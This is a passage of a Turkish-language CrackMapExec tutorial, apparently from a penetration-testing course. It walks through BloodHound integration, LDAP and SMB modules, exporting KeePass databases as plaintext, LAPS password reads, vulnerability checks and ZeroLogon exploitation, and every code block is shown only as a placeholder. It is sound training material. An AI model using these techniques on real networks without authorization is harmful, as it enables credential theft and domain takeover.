CrackMapExec'i, ele geÃ§irdiÄŸimiz herhangi bir user veya computer'Ä± BloodHound veritabanÄ±nda `owned` olarak iÅŸaretleyecek ÅŸekilde yapÄ±landÄ±rabiliriz. Bunu yapmak iÃ§in, `~/.cme/cme.conf` adresinde bulunan CrackMapExec yapÄ±landÄ±rma dosyasÄ±nÄ± aÅŸaÄŸÄ±daki seÃ§eneklerle deÄŸiÅŸtirmemiz gerekir:

* Bloodhound yapÄ±landÄ±rma seÃ§eneÄŸi `bh_enabled`'Ä± `True` olarak ayarlayÄ±n.
* `bh_uri`'yi Bloodhound veritabanÄ± `IP` adresimize ayarlayÄ±n.
* `bh_port`'u veritabanÄ± `portuna` ayarlayÄ±n
* Kimlik bilgilerini bloodhound veritabanÄ±yla eÅŸleÅŸecek ÅŸekilde ayarlayÄ±n: kullanÄ±cÄ± adÄ± `neo4j` ve ÅŸifre `asdasd123` (VeritabanÄ±nÄ±za karÅŸÄ±lÄ±k geleni kullandÄ±ÄŸÄ±nÄ±zdan emin olun).

YapÄ±landÄ±rma aÅŸaÄŸÄ±daki gibi gÃ¶rÃ¼nmelidir:


### Configuring BloodHound Database

{{CODE_BLOCK_187}}

Not: BaÄŸlandÄ±ÄŸÄ±nÄ±z BloodHound veritabanÄ±na karÅŸÄ±lÄ±k gelen kullanÄ±cÄ± adÄ± ve parolayÄ± kullandÄ±ÄŸÄ±nÄ±zdan emin olun.

### Bloodhound Verilerinin ToplanmasÄ±

BloodHound verilerini toplamak iÃ§in CrackMapExec kullanarak SharpHound'u Ã§alÄ±ÅŸtÄ±racak ve ardÄ±ndan dosyayÄ± saldÄ±rÄ± hostumuza aktaracaÄŸÄ±z.

### BloodHound verilerinin toplanmasÄ±

{{CODE_BLOCK_188}}

{{CODE_BLOCK_189}}

{{CODE_BLOCK_190}}

{{CODE_BLOCK_191}}

Åimdi BloodHound'u aÃ§mamÄ±z ve verileri iÃ§e aktarmamÄ±z gerekiyor.


### BloodHound'da KullanÄ±cÄ±larÄ± Owned Olarak Ayarlama

Veriler iÃ§e aktarÄ±ldÄ±ktan sonra, `robert` kullanÄ±cÄ±sÄ± ile baÄŸlanmaya Ã§alÄ±ÅŸÄ±rsak, kullanÄ±cÄ±yÄ± BloodHound veritabanÄ±nda owned olunan olarak ayarlayacaktÄ±r.

### KullanÄ±cÄ± BloodHound'da Owned Olarak Eklendi

{{CODE_BLOCK_192}}

Birden fazla kullanÄ±cÄ±sÄ± olan bir makineyi tehlikeye atarsak da aynÄ± ÅŸey olacaktÄ±r. Bulunan tÃ¼m yeni kullanÄ±cÄ±larÄ± owned olarak ayarlayacaktÄ±r.

### Procdump ModÃ¼lÃ¼ ile KullanÄ±cÄ±larÄ± Owned Olarak Ekleme

{{CODE_BLOCK_193}}


Not: TÃ¼m CrackMapExec seÃ§enekleri BloodHound veritabanÄ± ile senkronize olmayacaktÄ±r. Ã–rneÄŸin, `--ntds` veya `--lsa` seÃ§eneklerini denersek, kullanÄ±cÄ±larÄ± veritabanÄ±nda sahip olunan olarak iÅŸaretlemez, ancak `procdump` veya `lsassy` gibi modÃ¼ller kullanÄ±cÄ±larÄ± sahip olunan olarak iÅŸaretler.


### BloodHound'da BilgisayarlarÄ± Owned Olarak Ayarlama

YazÄ±m sÄ±rasÄ±nda, BloodHound entegrasyonu yalnÄ±zca user'larÄ± Owned olarak iÅŸaretlemektedir. Bir `computer` owned olarak iÅŸaretlemek istiyorsak, `bh_owned` modÃ¼lÃ¼nÃ¼ ve `neo4j` veritabanÄ±mÄ±zÄ±n kullanÄ±cÄ± adÄ± ve ÅŸifresini kullanabiliriz. AÅŸaÄŸÄ±daki Ã¶rnekte, diÄŸer varsayÄ±lan deÄŸerler neo4j veritabanÄ±mÄ±zla eÅŸleÅŸtiÄŸi iÃ§in yalnÄ±zca `PASS` seÃ§eneÄŸini ekleyeceÄŸiz.

{{CODE_BLOCK_194}}

{{CODE_BLOCK_195}}

BloodHound'un CrackMapExec'e entegrasyonu, bÃ¼yÃ¼k aÄŸlarla uÄŸraÅŸÄ±rken birÃ§ok seÃ§enek sunar ve mÃ¼ÅŸterilerimizle paylaÅŸmak istememiz durumunda veritabanÄ±nÄ± gÃ¼ncellemenin hÄ±zlÄ± bir yoludur. Bir sonraki bÃ¶lÃ¼mde, CrackMapExec'te mevcut olan bazÄ± popÃ¼ler modÃ¼llerle Ã§alÄ±ÅŸacaÄŸÄ±z.


----
### Popular Modules

CrackMapExec ile ilgili en heyecan verici ÅŸeylerden biri, modÃ¼ler olmasÄ± ve herkesin modÃ¼ller oluÅŸturmasÄ±na ve bunlarÄ± araca katkÄ±da bulunmasÄ±na izin vermesidir. CrackMapExec, exploit ve exploit sonrasÄ± gÃ¶revleri kolaylaÅŸtÄ±rmak iÃ§in iÅŸlemler gerÃ§ekleÅŸtirmemizi saÄŸlayan 50'den fazla modÃ¼le sahiptir. Bu bÃ¶lÃ¼mde LDAP ve SMB protokolleri iÃ§in bu modÃ¼llerden bazÄ±larÄ± incelenecektir.


### LDAP Protocol Modules

LDAP protokolÃ¼ yaygÄ±n olarak Domain Controller'lar ile etkileÅŸime geÃ§memizi ve onlardan bilgi almamÄ±zÄ± saÄŸlar. Active Directory'den ilginÃ§ bilgiler Ã§Ä±karmamÄ±zÄ± saÄŸlayacak bazÄ± modÃ¼lleri gÃ¶zden geÃ§irelim.


### **LDAP Module - get-network**

`get-network` modÃ¼lÃ¼ [Active Directory Integrated DNS dump](https://github.com/dirkjanm/adidnsdump)'Ä±  temel alÄ±r. VarsayÄ±lan olarak, Active Directory'deki herhangi bir kullanÄ±cÄ±, `zone transferine` benzer ÅŸekilde Domain veya Forest DNS bÃ¶lgelerindeki tÃ¼m DNS kayÄ±tlarÄ±nÄ± numaralandÄ±rabilir. Bu araÃ§, internal aÄŸlarÄ±n yeniden yapÄ±landÄ±rÄ±lmasÄ± amacÄ±yla bÃ¶lgedeki tÃ¼m DNS kayÄ±tlarÄ±nÄ±n numaralandÄ±rÄ±lmasÄ±nÄ± ve dÄ±ÅŸa aktarÄ±lmasÄ±nÄ± saÄŸlar.

ModÃ¼lÃ¼ kullanmanÄ±n Ã¼Ã§ (3) yolu vardÄ±r:
* Sadece IP adresini almak.
* Sadece domain isimlerini al.
* Her ikisini de al (IP ve domain adlarÄ±).

VarsayÄ±lan olarak, herhangi bir seÃ§enek belirtmezsek, modÃ¼l yalnÄ±zca IP adresini alacaktÄ±r. `ALL=true` seÃ§eneÄŸini seÃ§ersek, hem IP hem de domain adlarÄ±nÄ± alÄ±r ve `ONLY_HOSTS=true` olarak belirtirsek, yalnÄ±zca FQDN'yi alÄ±rÄ±z.


### DNS Sunucusundan (Record) KayÄ±tlarÄ± Alma

{{CODE_BLOCK_196}}

{{CODE_BLOCK_197}}

{{CODE_BLOCK_198}}


Not: Bu yazÄ±nÄ±n yazÄ±ldÄ±ÄŸÄ± zamanda, modÃ¼l **`adidnsdump`** aracÄ±yla bazÄ± farklÄ±lÄ±klar gÃ¶stermektedir. SonuÃ§lar, hesaplar arasÄ±nda farklÄ±lÄ±k gÃ¶sterebilir.


### LDAP Module - laps

Bir baÅŸka harika modÃ¼l de `laps` . `Local Administrator Password Solution (LAPS)`, domain'e baÄŸlÄ± bilgisayarlarda local hesap parolalarÄ±nÄ±n yÃ¶netimini saÄŸlar. Parolalar Active Directory'de (AD) saklanÄ±r ve ACL'ler tarafÄ±ndan korunur, bÃ¶ylece yalnÄ±zca belirli kullanÄ±cÄ±lar bunlarÄ± okuyabilir veya `parola sÄ±fÄ±rlama` talebinde bulunabilir. Laps modÃ¼lÃ¼ ile bir hesabÄ±n okuma eriÅŸimine sahip olduÄŸu tÃ¼m bilgisayarlarÄ± alabiliriz. Bir bilgisayarÄ± belirtmek iÃ§in `COMPUTER` seÃ§eneÄŸini de kullanabilir veya benzer ada sahip birkaÃ§ bilgisayarÄ± almak iÃ§in bir wildcard karakterle birlikte kullanabiliriz.


### LAPS ModÃ¼lÃ¼ ParolalarÄ±n AlÄ±nmasÄ±

{{CODE_BLOCK_199}}

{{CODE_BLOCK_200}}


Not: KullanÄ±lan parola bir Ã¶rnektir. Hedef hostta Ã§alÄ±ÅŸmayacaktÄ±r

### LDAP ModÃ¼lÃ¼ - MAQ

**Machine Account Quota (MAQ)**, **[MS-DS-Machine-AccountQuota](https://learn.microsoft.com/en-us/windows/win32/adschema/a-ms-ds-machineaccountquota)** **attribute**'Ã¼ ile temsil edilen ve varsayÄ±lan olarak bir **user**'Ä±n bir **domain** iÃ§inde oluÅŸturabileceÄŸi **computer account** sayÄ±sÄ±nÄ± belirten bir **domain level attribute**'tÃ¼r.

**[Resource Based Constrained Delegation](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution)** gibi bazÄ± **attack** senaryolarÄ±nda **domain** iÃ§inde bir **machine** oluÅŸturmak gerekebilir, bu yÃ¼zden **account machine quota attribute**'Ã¼nÃ¼ **enumerate** etmek Ã¶nemlidir.


### Machine Quota Module

{{CODE_BLOCK_201}}


### LDAP Module - daclread

Bir baÅŸka harika modÃ¼l ise bir veya birden fazla object'in `DACL`'lerini okumamÄ±zÄ± ve dÄ±ÅŸa aktarmamÄ±zÄ± saÄŸlayan `daclread`'dir. Bu modÃ¼l Active Directory eriÅŸimini numaralandÄ±rmamÄ±zÄ± saÄŸlayacaktÄ±r. AÅŸaÄŸÄ±daki seÃ§eneklere sahiptir:

### daclread Module Options

{{CODE_BLOCK_202}}

Diyelim ki **`grace`** hesabÄ±nÄ±n tÃ¼m **ACE**'lerini okumak istiyoruz. Bunun iÃ§in **`TARGET`** seÃ§eneÄŸini ve **`ACTION`** olarak **read** kullanabiliriz.


### Grace KullanÄ±cÄ±sÄ±nÄ±n DACL'sini Oku

{{CODE_BLOCK_203}}


AyrÄ±ca belirli haklarÄ± da arayabiliriz, Ã¶rneÄŸin hangi **principal**'larÄ±n **DCSync** haklarÄ±na sahip olduÄŸunu. Bunun iÃ§in **`TARGET_DN`** seÃ§eneÄŸini kullanarak **distinguished domain name (DN)** belirtmemiz, **`ACTION`** olarak **read** seÃ§eneÄŸini seÃ§memiz ve aramak istediÄŸimiz haklarÄ± **`RIGHTS`** seÃ§eneÄŸiyle belirlememiz gerekir.

### DCSync Rights'a Sahip KullanÄ±cÄ±larÄ± Arama

{{CODE_BLOCK_204}}



Ã‡Ä±ktÄ±da gÃ¶sterildiÄŸi gibi, `ACE[4]` `robert` kullanÄ±cÄ±sÄ±nÄ±n hedef domain'de `DCSync` haklarÄ±na sahip olduÄŸunu gÃ¶sterir.

LDAP'ta birkaÃ§ modÃ¼l daha kullanabiliriz. ModÃ¼llerin tam listesini gÃ¶rmek iÃ§in `-L` seÃ§eneÄŸini kullanabiliriz.

### LDAP Protocol Modules

{{CODE_BLOCK_205}}


### SMB Protocol Modules

SMB protokolÃ¼nde daha fazla modÃ¼l mevcuttur. CrackMapExec modÃ¼lÃ¼nde yaptÄ±ÄŸÄ±mÄ±z ÅŸeylerin Ã§oÄŸu SMB protokolÃ¼nÃ¼ kullanÄ±r. Ä°lginÃ§ bilgiler elde etmemizi saÄŸlayacak bazÄ± modÃ¼lleri gÃ¶zden geÃ§irelim.

Not: SMB kullanan modÃ¼llerin Ã§oÄŸunun Ã§alÄ±ÅŸmasÄ± iÃ§in admin haklarÄ±na ( `Pwned!` ) ihtiyaÃ§ vardÄ±r.


### SMB ModÃ¼lleri - get_netconnections ve ioxidresolver

Bir aÄŸ pentesti Ã¼zerinde Ã§alÄ±ÅŸÄ±rken, sÃ¼rekli olarak daha fazla kaynaÄŸa veya aÄŸa eriÅŸim elde etmeye Ã§alÄ±ÅŸÄ±rÄ±z. CrackMapExec, daha Ã¶nce tehlikeye attÄ±ÄŸÄ±mÄ±z bir makineyi numaralandÄ±rmamÄ±za ve birden fazla aÄŸ yapÄ±landÄ±rmasÄ±na sahip olup olmadÄ±ÄŸÄ±nÄ± belirlememize olanak tanÄ±yan bazÄ± modÃ¼llere sahiptir. `get_netconnections` ve `ioxidresolver` modÃ¼llerini kullanalÄ±m ve farklarÄ±nÄ± gÃ¶relim.

`get_netconnections` modÃ¼lÃ¼, aÄŸ baÄŸlantÄ±larÄ±nÄ± sorgulamak iÃ§in `WMI` kullanÄ±r. `IPv6` ve herhangi bir ikincil IP dahil olmak Ã¼zere tÃ¼m IP adreslerinin yanÄ± sÄ±ra domain adÄ±nÄ± da alÄ±r.


### get_netconnections Module

{{CODE_BLOCK_206}}


Ã–te yandan, `ioxidresolver` modÃ¼lÃ¼ IP adreslerini sorgulamak iÃ§in RPC kullanÄ±r. Ancak, bu modÃ¼l `IPv6` adreslerini iÃ§ermez.

### ioxidresolver Module

{{CODE_BLOCK_207}}


Not: Ä°htiyaÃ§larÄ±mÄ±za en uygun olanÄ± seÃ§ebilmemiz iÃ§in bir modÃ¼lÃ¼n nasÄ±l Ã§alÄ±ÅŸtÄ±ÄŸÄ±nÄ± anlamak Ã¶nemlidir.


### SMB Module - keepass_discover

`KeePass`, kurumsal aÄŸlarda adminler ve kullanÄ±cÄ±lar tarafÄ±ndan parolalarÄ± ve gizli bilgileri tek bir veritabanÄ±nda saklamak iÃ§in yaygÄ±n olarak kullanÄ±lan Ã¼cretsiz, aÃ§Ä±k kaynaklÄ± bir password manager'dÄ±r. Bir master password onu korur. Bir KeePass veritabanÄ± alÄ±rsak, onu aÃ§mak iÃ§in ÅŸifresine ihtiyacÄ±mÄ±z vardÄ±r.

### KeePass'i KeÅŸfetme

{{CODE_BLOCK_208}}

EÄŸer master parolaya sahip deÄŸilsek bir alternatif de Lee Christensen ( [@tifkin_](https://twitter.com/tifkin_)) ve Will Schroeder ( [@harmj0y](https://twitter.com/harmj0y)) tarafÄ±ndan geliÅŸtirilen ve veritabanÄ±nÄ± aÃ§Ä±k metin olarak dÄ±ÅŸa aktarmak iÃ§in KeePass'Ä±n triger sistemini kullanan bir teknik kullanmaktÄ±r. KeePass yapÄ±landÄ±rma dosyasÄ±nÄ±, veritabanÄ±nÄ± otomatik olarak aÃ§Ä±k metin olarak dÄ±ÅŸa aktaran bir [trigger](https://keepass.info/help/v2/triggers.html) iÃ§erecek ÅŸekilde deÄŸiÅŸtirir.

Bunu kullanmak iÃ§in beÅŸ (5) adÄ±ma ihtiyacÄ±mÄ±z var:

*  KeePass yapÄ±landÄ±rma dosyasÄ±nÄ± bulun. Biz bunu `keepass_discover` modÃ¼lÃ¼ ile yaptÄ±k.
 * `ACTION=ADD` seÃ§eneÄŸini ve `KEEPASS_CONFIG_PATH` Ã¶ÄŸesini kullanarak trigger'Ä± yapÄ±landÄ±rma dosyasÄ±na ekleyin.

### KeePass YapÄ±landÄ±rma DosyasÄ±na Trigger Ekleme

{{CODE_BLOCK_209}}

Not: KeePass yapÄ±landÄ±rma yolu iÃ§in ters eÄŸik Ã§izgi (`/`) veya Ã§ift eÄŸik Ã§izgi (`\`) kullandÄ±ÄŸÄ±nÄ±zdan emin olun.

* KullanÄ±cÄ±nÄ±n KeePass'i aÃ§masÄ±nÄ± ve master parolayÄ± girmesini bekleyin. Bu iÅŸlemi zorlamak iÃ§in `ACTION=RESTART` seÃ§eneÄŸini kullanarak KeePass.exe prosesini yeniden baÅŸlatabiliriz. Hedef makinede oturum aÃ§mÄ±ÅŸ Ã§ok sayÄ±da kullanÄ±cÄ± varsa, `USER=julio` gibi kullanÄ±cÄ± adÄ± ile `USER` seÃ§eneÄŸini ekleyebiliriz.

{{CODE_BLOCK_210}}


`ACTION=POLL` seÃ§eneÄŸini kullanarak export edilen veritabanÄ±nÄ± makinemize sorgulayÄ±n. Daha sonra ÅŸifre giriÅŸlerini aramak iÃ§in grep kullanabiliriz.


### Ele GeÃ§irilen Hedeften Export Verileri Sorgulama

{{CODE_BLOCK_211}}

{{CODE_BLOCK_212}}


`ACTION=CLEAN` seÃ§eneÄŸini ve `KEEPASS_CONFIG_PATH`'i kullanarak yapÄ±landÄ±rma dosyasÄ±nÄ± temizleyin

### Clean Configuration File Changes

{{CODE_BLOCK_213}}


Bu modÃ¼lÃ¼n her seÃ§eneÄŸini Ã¶ÄŸrendik, ancak **`ACTION=ALL`** kullanarak hepsini tek seferde alabiliriz. Bu seÃ§eneÄŸin iyi yanÄ±, **extract_password** yÃ¶ntemini de iÃ§ermesidir; bu yÃ¶ntem **.xml** dosyasÄ±nda herhangi bir parola giriÅŸini arar ve konsola yazdÄ±rÄ±r.


### keeppass_trigger TÃœMÃœNÃœ Tek Komutta Ã‡alÄ±ÅŸtÄ±rma

{{CODE_BLOCK_214}}

Not: ModÃ¼l ÅŸifreyi yazdÄ±rÄ±rken sorun yaÅŸayabilir. Bir hata alabiliriz, ancak ÅŸifre `/tmp/export.xml` dosyasÄ±nda olacaktÄ±r, bÃ¶ylece manuel olarak alabiliriz.

### RDP'yi EtkinleÅŸtirme veya Devre DÄ±ÅŸÄ± BÄ±rakma

DeÄŸerlendirme yaparken yapmak isteyebileceÄŸimiz yaygÄ±n bir gÃ¶rev, RDP aracÄ±lÄ±ÄŸÄ±yla bir hedef makineye baÄŸlanmaktÄ±r. Bu, baÅŸka tÃ¼rlÃ¼ lateral hareket saldÄ±rÄ±larÄ± gerÃ§ekleÅŸtiremediÄŸimiz veya standart bir protokol kullanarak radarÄ±n altÄ±ndan geÃ§mek istediÄŸimiz bazÄ± senaryolarda yararlÄ± olabilir.

BaÄŸlanmak istediÄŸimiz makinede RDP etkin deÄŸilse, buna izin vermek iÃ§in RDP modÃ¼lÃ¼nÃ¼ kullanabiliriz. `ACTION` seÃ§eneÄŸini ve ardÄ±ndan `enable` veya `disable` seÃ§eneklerini belirtmemiz gerekir.


### RDP'yi EtkinleÅŸtirme

{{CODE_BLOCK_215}}


SMB'de birkaÃ§ modÃ¼l daha vardÄ±r. ModÃ¼llerin tam listesini gÃ¶rmek iÃ§in `-L` seÃ§eneÄŸini kullanabiliriz.


### SMB Protocol Modules

{{CODE_BLOCK_216}}

Bir sonraki bÃ¶lÃ¼mde, ZeroLogon gibi bilinen gÃ¼venlik aÃ§Ä±klarÄ±ndan yararlanan diÄŸer SMB modÃ¼llerine bakacaÄŸÄ±z

### Vulnerability Scan Modules

SÄ±zma testi yaparken gerÃ§ekleÅŸtirdiÄŸimiz gÃ¼nlÃ¼k faaliyetlerden biri gÃ¼venlik aÃ§Ä±klarÄ±nÄ± tespit etmeye Ã§alÄ±ÅŸmaktÄ±r. EÄŸer herhangi birini bulabilirsek, exploitation iÅŸi basit olabilir.

CrackMapExec, gÃ¼venlik aÃ§Ä±klarÄ±nÄ± tespit etmemizi saÄŸlayan bazÄ± modÃ¼ller iÃ§erir. Bu oturumda bunlardan bazÄ±larÄ±nÄ± inceleyeceÄŸiz.


### Environment'i Ayarlama

Bu senaryoda, bir sunucuyu ele geÃ§irdik ve admin kimlik bilgilerini elde ettik. Bu sunucunun iki aÄŸ kartÄ± var ve amacÄ±mÄ±z domainin saldÄ±rÄ±ya karÅŸÄ± savunmasÄ±z olup olmadÄ±ÄŸÄ±nÄ± belirlemek. Domainin IP adresi `172.16.10.3`'tÃ¼r.

Domain'e eriÅŸim saÄŸlamak iÃ§in, CME ile ProxyChain bÃ¶lÃ¼mÃ¼nde Ã¶ÄŸrendiklerimizi kullanacaÄŸÄ±z ve Chisel ile bir baÄŸlantÄ± kuracaÄŸÄ±z


### Chisel'i Hedef Makineye GÃ¶nderme

{{CODE_BLOCK_217}}


### SaldÄ±rÄ± Hostumuzda Chisel'Ä± Sunucu Olarak Ã‡alÄ±ÅŸtÄ±rma

{{CODE_BLOCK_218}}


### Chisel'Ä± Tehlikeye DÃ¼ÅŸmÃ¼ÅŸ Cihazdan SaldÄ±rÄ± Hostumuza BaÄŸlama

{{CODE_BLOCK_219}}


### Vulnerability Scan Modules

CrackMapExec'teki gÃ¼venlik aÃ§Ä±ÄŸÄ± modÃ¼llerinin Ã§oÄŸu yalnÄ±zca kontrol edilir ve bu modÃ¼lleri gÃ¼venlik aÃ§Ä±klarÄ±ndan yararlanmak iÃ§in kullanamayÄ±z. [ZeroLogon gÃ¼venlik aÃ§Ä±ÄŸÄ±](https://www.secura.com/uploads/whitepapers/Zerologon.pdf) ile baÅŸlayalÄ±m.


### ZeroLogon

KimliÄŸi doÄŸrulanmamÄ±ÅŸ bir saldÄ±rgan, bir domain controller'a aÄŸ eriÅŸimi ile[ ZeroLogon gÃ¼venlik aÃ§Ä±ÄŸÄ±ndan (CVE-2020-1472)](https://www.secura.com/uploads/whitepapers/Zerologon.pdf) faydalanabilir. Bu gÃ¼venlik aÃ§Ä±ÄŸÄ±nÄ± kÃ¶tÃ¼ye kullanmak ve sonunda domain'in controller'Ä± ele geÃ§irmek iÃ§in savunmasÄ±z bir Netlogon session'Ä± baÅŸlatmasÄ± gerekir. Bir Domain Controller'a baÄŸlanmak baÅŸarÄ±lÄ± bir saldÄ±rÄ± iÃ§in tek Ã¶n koÅŸul olduÄŸundan, gÃ¼venlik aÃ§Ä±ÄŸÄ± ciddidir.

CrackMapExec, bir Domain Controller'Ä±n ZeroLogon'a karÅŸÄ± savunmasÄ±z olup olmadÄ±ÄŸÄ±nÄ± tanÄ±mlayan zerologon adlÄ± bir modÃ¼l iÃ§erir.


### ZeroLogon GÃ¼venlik AÃ§Ä±ÄŸÄ± KontrolÃ¼

{{CODE_BLOCK_220}}


### PetitPotam

GÃ¼venlik araÅŸtÄ±rmacÄ±sÄ± [Gilles Lionel](https://twitter.com/topotam77) kÄ±sa bir sÃ¼re Ã¶nce [PetitPotam](https://github.com/topotam/PetitPotam) adÄ± verilen ve saldÄ±rganlarÄ±n sadece kurumsal aÄŸ altyapÄ±sÄ±na eriÅŸim saÄŸlayarak domain'i tehlikeye atmasÄ±na olanak tanÄ±yan bir saldÄ±rÄ± tekniÄŸini ortaya Ã§Ä±kardÄ±. YÃ¶ntem, sunulan herhangi bir sunucu servisine (Ã¶rneÄŸin bir Domain Controller) yÃ¶nelik klasik bir `NTLM relay` saldÄ±rÄ±sÄ±dÄ±r. Lionel ayrÄ±ca [GitHub PetitPotam](https://github.com/topotam/PetitPotam)'da saldÄ±rganlarÄ±n domain'i ele geÃ§irmek iÃ§in bu Ã¶zel saldÄ±rÄ± tekniÄŸini nasÄ±l kullanabileceklerini gÃ¶steren bir proof of  concept kodu da yayÄ±nladÄ±.

CrackMapExec, bir Domain Controller'Ä±n PetitPotam'a karÅŸÄ± savunmasÄ±z olup olmadÄ±ÄŸÄ±nÄ± tanÄ±mlayan `petitpotam` adlÄ± bir modÃ¼l iÃ§erir.


### Petitpotam GÃ¼venlik AÃ§Ä±ÄŸÄ± KontrolÃ¼

{{CODE_BLOCK_221}}


### noPAC

noPAC gÃ¼venlik aÃ§Ä±ÄŸÄ±nÄ±n exploit'i, normal bir domain kullanÄ±cÄ±sÄ±nÄ±n ayrÄ±calÄ±klarÄ±nÄ±n bir domain admin yÃ¼kseltilmesine izin verdi. Kavram kanÄ±tÄ± (PoC) [GitHub](https://github.com/Ridter/noPac)'da yayÄ±nlandÄ±.

CrackMapExec, bir domain controller'Ä±n noPAC'a karÅŸÄ± savunmasÄ±z olup olmadÄ±ÄŸÄ±nÄ± tanÄ±mlayan nopac adlÄ± bir modÃ¼l iÃ§erir.


### noPAC vulnerability check

{{CODE_BLOCK_222}}



### DFSCoerce

[Filip Dragovic](https://twitter.com/filip_dragovic), DFSCoerce adlÄ± bir NTLM relay saldÄ±rÄ±sÄ± iÃ§in bir kavram kanÄ±tÄ± ([PoC](https://github.com/Wh04m1001/DFSCoerce)) yayÄ±nladÄ±. YÃ¶ntem, bir Windows domain'inin controller'Ä± ele geÃ§irmek iÃ§in Distributed File System: Namespace Management Protocol (MS-DFSNM) kullanarak bir Windows domain'inin kontrolÃ¼nÃ¼ ele geÃ§iriyor.

Bu saldÄ±rÄ± bir domain kullanÄ±cÄ±sÄ± gerektirir ve bir DC'nin savunmasÄ±z olup olmadÄ±ÄŸÄ±nÄ± belirlemek iÃ§in CrackMapExec modÃ¼lÃ¼ `dfscoerce`'yi kullanabiliriz. Bu gÃ¼venlik aÃ§Ä±ÄŸÄ±nÄ± kontrol etmek iÃ§in `Y3t4n0th3rP4ssw0rd` ÅŸifresiyle `carole.holmes` hesabÄ±nÄ± kullanacaÄŸÄ±z.


### DFSCoerce Vulnerability Check

{{CODE_BLOCK_223}}


### ShadowCoerce

ShadowCoerce, gÃ¼venlik araÅŸtÄ±rmacÄ±sÄ± Lionel Gilles tarafÄ±ndan 2021'in sonlarÄ±nda PetitPotam saldÄ±rÄ±sÄ±nÄ± sergileyen bir sunumun sonunda keÅŸfedildi ve ilk kez detaylandÄ±rÄ±ldÄ±. [Charlie Bromberg](https://twitter.com/_nwodtuhs) bir kavram kanÄ±tÄ± ([PoC](https://github.com/ShutdownRepo/ShadowCoerce)) oluÅŸturdu.

CrackMapExec modÃ¼lÃ¼ shadowcoerce kullanarak DC'nin bu saldÄ±rÄ±ya karÅŸÄ± savunmasÄ±z olup olmadÄ±ÄŸÄ±nÄ± kontrol etmek iÃ§in carole.holmes hesabÄ±nÄ± kullanalÄ±m.


### ShadowCoerce Vulnerability Check

{{CODE_BLOCK_224}}


GÃ¼venlik aÃ§Ä±ÄŸÄ± tarama modÃ¼llerinin Ã§oÄŸu yazarÄ±, bilgisayarÄ±n gÃ¼venlik aÃ§Ä±ÄŸÄ± olup olmadÄ±ÄŸÄ±na dair bir mesaj eklememiÅŸtir, bu nedenle komut Ã§alÄ±ÅŸtÄ±rÄ±ldÄ±ktan sonra hiÃ§bir ÅŸey gÃ¶rmeyiz. Ancak, ( `./CrackMapExec/cme/modules/shadowcoerce.py`) adresinde bulunan shadowcoerse modÃ¼lÃ¼nÃ¼n kaynak kodunu kontrol edersek, yazarÄ±n ( `logging.debug` ) ile bazÄ± debug log'larÄ± eklediÄŸini gÃ¶receÄŸiz. CrackMapExec'i hata debug modunda Ã§alÄ±ÅŸtÄ±rÄ±rsak, bu loglarÄ± yazdÄ±racaktÄ±r.

CrackMapExec'i debug modunda Ã§alÄ±ÅŸtÄ±rmak iÃ§in protokolden Ã¶nce `--verbose` seÃ§eneÄŸini kullanabiliriz


### shadowcoerce ModÃ¼lÃ¼nÃ¼ Verbose Enabled ile Ã‡alÄ±ÅŸtÄ±rma

{{CODE_BLOCK_225}}


`DEBUG` ile baÅŸlayan satÄ±rlar `logging.debug`'a karÅŸÄ±lÄ±k gelir. Son satÄ±rlarda hedefin savunmasÄ±z olmadÄ±ÄŸÄ±nÄ± gÃ¶sterdiÄŸini gÃ¶rebiliriz.


### MS17-010 (EternalBlue)

MS17-010, diÄŸer adÄ±yla EternalBlue, Windows iÅŸletim sistemleri iÃ§in Microsft tarafÄ±ndan 14 Mart 2017 tarihinde yayÄ±nlanan bir gÃ¼venlik yamasÄ±dÄ±r. Yama, SMB servisindeki kritik bir kimliÄŸi doÄŸrulanmamÄ±ÅŸ remote kod Ã§alÄ±ÅŸtÄ±rma aÃ§Ä±ÄŸÄ± iÃ§indir. Bu gÃ¼venlik aÃ§Ä±ÄŸÄ± hakkÄ±nda daha fazla bilgi edinmek iÃ§in [Microsoft GÃ¼venlik BÃ¼lteni MS17-010](https://learn.microsoft.com/en-us/security-updates/SecurityBulletins/2017/ms17-010?redirectedfrom=MSDN) - Kritik'i okuyabiliriz.

CrackMapExec, bir domain controller'Ä±n MS17-010'a karÅŸÄ± savunmasÄ±z olup olmadÄ±ÄŸÄ±nÄ± belirleyen ms17-010 adlÄ± bir modÃ¼l iÃ§erir.


### MS17-010 Vulnerability Check

{{CODE_BLOCK_226}}


### GÃ¼venlik AÃ§Ä±ÄŸÄ±ndan Yararlanma

BirÃ§ok gÃ¼venlik aÃ§Ä±ÄŸÄ± gÃ¶rdÃ¼k. Onlardan birini exploit etmeye Ã§alÄ±ÅŸalÄ±m: ZeroLogon. ModÃ¼l tarafÄ±ndan saÄŸlanan baÄŸlantÄ±ya gidelim https://github.com/dirkjanm/CVE-2020-1472 ve onu kullanalÄ±m:


### Exploiting ZeroLogon

{{CODE_BLOCK_227}}

{{CODE_BLOCK_228}}


Zaman geÃ§tikÃ§e yeni gÃ¼venlik aÃ§Ä±klarÄ± ortaya Ã§Ä±kacaktÄ±r ve bunlar sektÃ¶r uzmanlarÄ± veya bizim tarafÄ±mÄ±zdan CrackMapExec'e modÃ¼l olarak eklenebilir. Bir sonraki bÃ¶lÃ¼mde, CrackMapExec iÃ§in nasÄ±l bir modÃ¼l oluÅŸturabileceÄŸimizi gÃ¶receÄŸiz.

---

### Kendi CME ModÃ¼lÃ¼mÃ¼zÃ¼ OluÅŸturmak

Yazarlar ve topluluk tarafÄ±ndan oluÅŸturulan birÃ§ok yerleÅŸik CrackMapExec modÃ¼lÃ¼nÃ¼ kullandÄ±k. Bu bÃ¶lÃ¼mde CrackMapExec iÃ§in modÃ¼lÃ¼mÃ¼zÃ¼ nasÄ±l yapabileceÄŸimizi keÅŸfedeceÄŸiz.


### CrackMapExec'i Poetry ile derleyin

ModÃ¼lÃ¼mÃ¼zÃ¼ oluÅŸturmadan Ã¶nce, CrackMapExec projesinin nasÄ±l derleneceÄŸini bilmek Ã§ok Ã¶nemlidir. Bu amaÃ§la CME, projelerimizi oluÅŸtururken Ã¶nerilen [Poetry](https://python-poetry.org/)'yi kullanÄ±r. Poetry kullanmÄ±yorsanÄ±z, CrackMapExec'i Ã§alÄ±ÅŸtÄ±rmak Ã¼zere Poetry kullanmaya baÅŸlamak iÃ§in Kurulum ve Binaryler bÃ¶lÃ¼mÃ¼ne bir gÃ¶z atÄ±n

